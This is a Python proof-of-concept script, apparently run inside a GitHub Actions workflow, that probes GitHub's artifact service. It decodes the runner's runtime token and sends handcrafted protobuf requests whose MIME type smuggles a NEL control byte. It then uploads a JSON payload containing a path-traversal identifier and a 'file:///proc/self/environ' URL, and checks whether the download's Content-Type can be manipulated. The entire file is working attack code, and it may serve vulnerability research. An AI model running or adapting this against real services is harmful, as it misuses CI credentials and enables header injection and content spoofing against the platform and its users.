import base64
import json
import os
import urllib.error
import urllib.parse
import urllib.request

TOKEN = os.environ['ACTIONS_RUNTIME_TOKEN']
RESULTS = os.environ['ACTIONS_RESULTS_URL']
REPO = os.environ['GITHUB_REPOSITORY']
GH_TOKEN = os.environ['GITHUB_TOKEN']
claims = json.loads(base64.urlsafe_b64decode(TOKEN.split('.')[1] + '==='))
scope = next(part for part in claims['scp'].split() if part.startswith('Actions.Results:'))
_, run_id, job_id = scope.split(':')
endpoint = urllib.parse.urljoin(RESULTS, '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact')


def varint(value):
    out = bytearray()
    while value >= 128:
        out.append((value & 127) | 128)
        value >>= 7
    out.append(value)
    return bytes(out)


def field(number, value):
    return varint(number << 3 | 2) + varint(len(value)) + value


def value_from_binary(data):
    # The successful Twirp response contains a signed URL in a string field.
    offset = 0
    while offset < len(data):
        tag, offset = read_varint(data, offset)
        wire = tag & 7
        if wire == 0:
            _, offset = read_varint(data, offset)
        elif wire == 2:
            length, offset = read_varint(data, offset)
            value = data[offset:offset + length]
            offset += length
            if value.startswith(b'https://'):
                return value.decode()
        else:
            raise ValueError(f'unexpected protobuf wire type {wire}')
    raise ValueError('successful CreateArtifact lacked signed upload URL')


def read_varint(data, offset):
    value = 0
    shift = 0
    while True:
        byte = data[offset]
        offset += 1
        value |= (byte & 127) << shift
        if byte < 128:
            return value, offset
        shift += 7


def request(url, data=None, headers=None, method=None, no_redirect=False):
    req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    if no_redirect:
        class Stop(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, *args):
                return None
        opener = urllib.request.build_opener(Stop)
    else:
        opener = urllib.request.build_opener()
    try:
        return opener.open(req, timeout=25)
    except urllib.error.HTTPError as error:
        return error


def put(url, body, mime):
    with request(url, body, {
        'Content-Type': 'application/octet-stream',
        'x-ms-version': '2023-11-03',
        'x-ms-blob-type': 'BlockBlob',
        'x-ms-blob-content-type': mime,
    }, 'PUT') as response:
        return response.status


for label, mime_bytes in [('prefix', b'\x85application/json'),
                          ('suffix', b'application/json\x85')]:
    name = f'bare-proto-nel-{os.environ["GITHUB_RUN_ID"]}-{label}'
    message = b''.join([
        field(1, run_id.encode()),
        field(2, job_id.encode()),
        field(3, name.encode()),
        varint(5 << 3) + varint(7),
        field(6, field(1, mime_bytes)),
    ])
    row = {'case': label, 'mimeHex': mime_bytes.hex()}
    with request(endpoint, message, {
        'Authorization': f'Bearer {TOKEN}',
        'Accept': 'application/protobuf',
        'Content-Type': 'application/protobuf',
    }, 'POST') as response:
        created = response.read()
        row['createStatus'] = response.status
        if response.status != 200:
            row['createError'] = created.decode(errors='replace')[:220]
        else:
            signed_url = value_from_binary(created)
            mime = mime_bytes.decode('latin1')
            row['placeholderUpload'] = put(signed_url, b'{}', mime)
            finalize_url = endpoint.replace('/CreateArtifact', '/FinalizeArtifact')
            finalize_request = {
                'workflow_run_backend_id': run_id,
                'workflow_job_run_backend_id': job_id,
                'name': name, 'size': '2',
            }
            with request(finalize_url, json.dumps(finalize_request).encode(), {
                'Authorization': f'Bearer {TOKEN}',
                'Content-Type': 'application/json',
            }, 'POST') as finalized:
                row['finalizeStatus'] = finalized.status
                body = finalized.read()
                if finalized.status == 200:
                    artifact_id = json.loads(body)['artifact_id']
                    row['artifactId'] = artifact_id
                    identifier = f'x/../{REPO}/actions/artifacts/{artifact_id}/zip'
                    payload = json.dumps({'full_name': identifier, 'owner': {
                        'login': 'cassette', 'avatar_url': 'file:///proc/self/environ'}},
                        separators=(',', ':')).encode()
                    row['payloadUpload'] = put(signed_url, payload, mime)
                    api = f'https://api.github.com/repos/{REPO}/actions/artifacts/{artifact_id}/zip'
                    with request(api, headers={
                        'Authorization': f'Bearer {GH_TOKEN}',
                        'Accept': 'application/vnd.github.v3+json',
                        'User-Agent': 'repo-cassette-bare-proto-probe',
                    }, no_redirect=True) as redirect:
                        row['restStatus'] = redirect.status
                        location = redirect.headers.get('Location', '')
                        if location:
                            row['rsct'] = urllib.parse.parse_qs(
                                urllib.parse.urlsplit(location).query).get('rsct', [''])[0]
                            with request(location) as download:
                                row['downloadStatus'] = download.status
                                row['downloadType'] = download.headers.get('Content-Type')
                                row['bodyMatch'] = download.read() == payload
                else:
                    row['finalizeError'] = body.decode(errors='replace')[:220]
    print('::notice title=Bare protobuf NEL::' +
          json.dumps(row, separators=(',', ':')), flush=True)
